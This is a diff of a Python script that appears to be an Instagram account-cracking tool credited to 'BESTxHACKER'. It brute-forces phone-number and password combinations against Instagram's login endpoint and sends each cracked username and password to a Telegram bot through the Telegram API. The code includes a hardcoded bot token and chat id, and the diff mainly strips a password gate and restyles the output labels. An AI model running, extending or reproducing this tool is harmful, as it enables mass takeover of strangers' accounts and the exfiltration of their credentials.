@@ -1,22 +1,12 @@
 #AUTHER:FaRa CH:BESTxHACKER
-input("Enter Your Name: ")
-print(' Baxer BeY')
 import requests
+import user_agent
 import json
 import time
 import random
 import sys
 import os
-print('\x1b[0;33m  telegram : https://t.me/BESTxHACKER')
-print('\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=\x1b[1;31m=')
-h = input('YOU NAME ')
-print(f" {h} ENTER PASS")
-p = input('B' + ' PASSWORD »  ')
-if p == 'Fara':
-    print('you Are Active Hamdy')
-else:
-    print(B + 'PASSWORD ERROR Messege FaRa  @B_1_2_4')
-    sys.exit()
+
 user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
 user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55'
 user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Vivaldi/4.1'
@@ -27,7 +17,7 @@ user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTM
 id_my = '1371291947'
 token_my = '1997668074:AAHv1kRIEeQgn-Xtq4oxmJroHwKnWlb63T4'
 os.system('rm -rf Cart.txt')
-num = '''\033[33m 770 + 771 + 772 +773 +774 + 750 + 751 +752 +753 +754 + 780 + 781 + 782 + 783 + 784
+num = '''\033[32m 770 + 771 + 772 +773 +774 + 750 + 751 +752 +753 +754 + 780 + 781 + 782 + 783 + 784
 '''
 url="https://www.instagram.com/accounts/login/ajax/"
 headers={
@@ -52,11 +42,11 @@ headers={
     'x-requested-with': 'XMLHttpRequest',
 }
 banek='''\x1b[0;1m
- [\033[34m1\x1b[0;1m"] - Crack RAQAM+PASS
- [\033[34m2\x1b[0;1m"] - Crack RAQAM+RAQAM
- [\033[34m3\x1b[0;1m"] - Crack GMAIL+RAQAM
- [\033[34m4\x1b[0;1m"] - Crack EMAIL+PASS
- [\033[34m0\x1b[0;1m"] - Exit Tool
+ [\033[31m1\x1b[0;1m"] - Crack RAQAM+PASS
+ [\033[31m2\x1b[0;1m"] - Crack RAQAM+RAQAM
+ [\033[31m3\x1b[0;1m"] - Crack GMAIL+RAQAM
+ [\033[31m4\x1b[0;1m"] - Crack EMAIL+PASS
+ [\033[31m0\x1b[0;1m"] - Exit Tool
 '''
 logo = '''\x1b[0;1m
 
@@ -73,11 +63,13 @@ ___) (___| )  \  |/\____) |   | |   | )   ( || (___) || ) \ \__| )   ( || )   ( 
 
                                                                           
                                                                           
- This Tool ls No Money ! 
+ This Tool ls No Money...! 
+ 
  Auther   : B_1_2_4
+ 
  Channal : BESTxHACKER
  ---------------------------------------------------------------------
- Thank You For using it Pleas Wait 1h or 2h
+ Thank You For using it 
  '''
 logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
 
@@ -183,9 +175,9 @@ def crack():
 			
 			print(logo)
 			print(logo2)
-			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m Checkpoint : '+str(r2))
-			print('\033[31m Bad : '+str(r3))
+			print('\033[32m HACK BW : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m SUTAW : '+str(r3))
 			print(logo2)
 			sender =user+' : '+pas
 			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
@@ -197,9 +189,9 @@ def crack():
 			
 			print(logo)
 			print(logo2)
-			print('\033[32m Hacked : '+str(r1))
+			print('\033[32m HACK BW : '+str(r1))
 			print('\033[93m CP : '+str(r2))
-			print('\033[31m Bad : '+str(r3))
+			print('\033[31m SUTAW : '+str(r3))
 			print(logo2)
 		
 		
@@ -208,9 +200,9 @@ def crack():
 		
 			print(logo)
 			print(logo2)
-			print('\033[32m Hacked : '+str(r1))
+			print('\033[32m HACK BW : '+str(r1))
 			print('\033[93m CP : '+str(r2))
-			print('\033[31m Bad : '+str(r3))
+			print('\033[31m SUTAW : '+str(r3))
 			print(logo2)
 			print(reba)
 			time.sleep(50.0)
@@ -223,9 +215,9 @@ def crack():
 			
 			print(logo)
 			print(logo2)
-			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m Checkpoint : '+str(r2))
-			print('\033[31m Bad : '+str(r3))
+			print('\033[32m HACK BW : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m SUTAW : '+str(r3))
 			print(logo2)
 
 
